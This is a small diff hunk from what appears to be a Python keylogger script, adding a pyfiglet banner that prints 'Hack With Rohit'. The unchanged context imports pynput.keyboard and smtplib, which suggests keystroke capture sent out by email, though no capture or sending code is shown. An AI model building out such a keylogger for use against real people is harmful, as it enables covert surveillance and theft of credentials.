@@ -4,6 +4,10 @@
 import pynput.keyboard
 import smtplib
 import threading
+import pyfiglet
+
+msg = pyfiglet.figlet_format("Hack With Rohit")
+print(msg)
 
 log = ""
 
